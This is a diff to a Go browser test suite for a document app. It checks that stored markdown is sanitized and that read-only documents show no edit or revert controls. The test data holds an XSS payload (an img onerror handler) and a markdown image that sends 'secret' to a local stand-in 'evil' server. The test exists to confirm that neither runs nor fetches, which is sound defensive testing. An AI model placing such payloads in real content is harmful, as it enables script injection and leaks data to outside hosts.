@@ -3,10 +3,12 @@ package scenarios
 import (
 	"encoding/json"
 	"fmt"
+	"net/http"
 	"os"
 	"slices"
 	"strings"
 	"testing"
+	"time"
 )
 
 // themeProbe is the HTML of a custom block that reports the theme of its host, first and after each change.
@@ -214,10 +216,15 @@ func TestRealBrowserDocuments(t *testing.T) {
 		t.Skip("set DECK_REAL_BROWSER=1 to run against Playwright MCP")
 	}
 	checkBuiltClient(t)
+	evil := newService(t, func(w http.ResponseWriter, r *http.Request, n int) { w.Write([]byte("GIF89a")) })
 	e := newEnv(t, nil)
 	e.createProject("web", docsManifest)
 	var d struct{ ID int64 }
-	e.must("deck.document_save", map[string]any{"project": "web", "name": "notes/criteria.md", "kind": "doc", "text": "# Criteria\n\n- **short** <img src=x onerror=alert(1)>"}, &d)
+	e.must("deck.document_save", map[string]any{"project": "web", "name": "notes/criteria.md", "kind": "doc",
+		"text": "# Criteria\n\n- **short** <img src=x onerror=alert(1)>\n\n![seen](" + evil.URL + "/pixel?d=secret)"}, &d)
+	for _, text := range []string{"<p>one</p>", "<p>two</p>"} {
+		e.must("deck.document_save", map[string]any{"project": "web", "name": "custom/chart.html", "kind": "custom", "text": text}, nil)
+	}
 	e.must("deck.records_upsert", map[string]any{"project": "web", "collection": "notes", "records": jsonl(map[string]any{"title": "alpha", "note": "a **bold** note"})}, nil)
 
 	b := newPlaywright(t)
@@ -227,6 +234,11 @@ func TestRealBrowserDocuments(t *testing.T) {
 	b.until("the named document on the main screen", `document.querySelector('[data-document="notes/criteria.md"] [data-markdown] h1')?.innerText === 'Criteria'`)
 	if got := b.eval(`String(!!document.querySelector('[data-markdown] img[onerror]'))`); got != "false" {
 		t.Fatal("markdown is sanitized: no handlers in the page")
+	}
+	b.until("the picture of the markdown in the page", `document.querySelector('[data-markdown] img[alt="seen"]')`)
+	time.Sleep(time.Second)
+	if n := len(evil.requests()); n != 0 {
+		t.Fatalf("a picture in markdown is not fetched from the network: %d requests", n)
 	}
 
 	b.eval(`([...document.querySelectorAll('nav a')].find((a) => a.innerText.trim() === 'Documents').click(), '')`)
@@ -269,6 +281,17 @@ func TestRealBrowserDocuments(t *testing.T) {
 	b.until("the manifest as source", `document.querySelector('[data-document="manifest.json"] [data-source]')?.innerText.includes('"collections"')`)
 	if got := b.eval(`String(!!document.querySelector('[data-edit]'))`); got != "false" {
 		t.Fatal("the manifest is read only on screen")
+	}
+	for _, x := range ds {
+		if x.Name == "custom/chart.html" {
+			b.open(e.URL + "/#/p/web/document/" + fmt.Sprint(x.ID))
+		}
+	}
+	b.until("the history of the custom block", `document.querySelector('[data-document="custom/chart.html"] [data-history]')`)
+	b.eval(`(document.querySelector('[data-history]').click(), '')`)
+	b.until("its revisions", `document.querySelector('[data-revision="1"]')`)
+	if got := b.eval(`String(!!document.querySelector('[data-revert]') || !!document.querySelector('[data-edit]'))`); got != "false" {
+		t.Fatal("a read-only document has no edit and no going back on screen")
 	}
 	b.call("browser_resize", map[string]any{"width": 390, "height": 844})
 	b.open(e.URL + "/#/p/web/document/" + fmt.Sprint(d.ID))
